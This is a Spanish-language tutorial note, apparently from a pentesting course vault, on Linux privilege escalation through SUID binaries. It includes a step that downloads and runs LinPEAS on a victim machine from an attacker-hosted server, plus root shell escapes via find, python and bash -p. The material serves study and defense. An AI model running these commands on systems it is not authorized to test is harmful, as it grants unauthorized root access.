## 🛡️ Escalada de Privilegios: Bit SUID

El **Bit SUID (Set owner User ID)** es un permiso especial que permite que un archivo se ejecute con los privilegios del **propietario** del archivo, en lugar de los privilegios del usuario que lo lanza. Si un binario pertenece a `root` y tiene el bit SUID, cualquier usuario que lo ejecute actuará como `root` durante la ejecución de ese programa.

- **Identificación:** Verás una **`s`** en el lugar de la `x` del propietario (Ej: -rw**s**r-xr-x).
- **Riesgo:** Si el binario permite ejecutar comandos externos, leer archivos o editar el sistema, se convierte en un vector de escalada.

## 🔍 Fase 1: Enumeración - Encuentra todos los SUID
Debemos buscar agujeros en el sistema: binarios que no deberían tener este permiso activado.
### El Comando Find
- `find / -perm -4000 -type f 2>/dev/null`

1. `/`: Busca desde la raíz.
2. `-perm -4000`: Filtra archivos con el bit SUID (el `4` representa el SUID).
3. `2>/dev/null`: Oculta errores de "Permiso denegado".
### Automatización con [[LinPEAS]]
Te marcará en **ROJO** los binarios SUID más interesantes y peligrosos.

En tu máquina (atacante)
- `python3 -m http.server 80

En la máquina víctima
- `wget http://TU_IP/linpeas.sh`
- `chmod +x linpeas.sh`
- `./linpeas.sh -a` (el flag `-a` realiza un análisis profundo).

Busca la sección **"Interesting Files"** y dentro **"SUID binaries"**
## 🔬 Fase 2: ANÁLISIS
Una vez que tienes la lista de binarios SUID, por ejemplo:

```
/usr/bin/find
/usr/bin/base64
/usr/bin/python3.8
/bin/bash
/bin/mount
/usr/bin/vim.basic
/usr/bin/pkexec  (Este es el de Polkit, ya es más complejo, pero también válido)
```

No necesitas adivinar cómo explotarlos. Existe una "biblia" para esto:

> [!important] **Herramienta indispensable: [GTFOBins](https://gtfobins.github.io/)** GTFOBins es un catálogo de binarios de Unix que pueden ser utilizados para saltar restricciones de seguridad si tienen permisos SUID o SUDO.
### ¿Cómo usar GTFOBins?

**Pasos:**
1. Entra en la web.
2. Busca tu binario (ej. `find`, `vim`, `python`, etc.).
3. Haz clic en el botón **SUID**.
4. Te dará el comando exacto que tienes que copiar y pegar.

## 💥 Fase 3: Explotación (Ejemplos Reales)

Aquí tienes cómo se vería la explotación de algunos binarios comunes si tuvieran el bit SUID:
### Caso A: `find`
Si `find` tiene el bit SUID, puedes usar su capacidad de ejecutar comandos (`-exec`):
- `find . -exec /bin/sh -p \; -quit`
### Caso B: `python`
Python permite importar la librería `os` para lanzar una shell:
- `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
### Caso C: `bash`
A veces, los administradores dejan la propia `bash` con SUID (un error fatal):
- `bash -p`

> [!note] **¿Por qué el flag `-p`?** La mayoría de las shells modernas detectan si su UID real es distinto al efectivo y "sueltan" los privilegios de root por seguridad. El flag `-p` (privileged) obliga a la shell a mantener esos privilegios de `root`.

## 🚩 Resumen de flujo

1. **Buscar:** `find / -perm -4000...`
2. **Identificar:** ¿Hay algo raro? (ej. `base64`, `cp`, `nano`).
3. **Consultar:** Ir a GTFOBins.
4. **Ejecutar:** Copiar el comando y ganar `root`.

---
**Navegación:**
- Volver a: [[3.5 Escalada de Privilegios en Linux]]
- [[Técnicas]]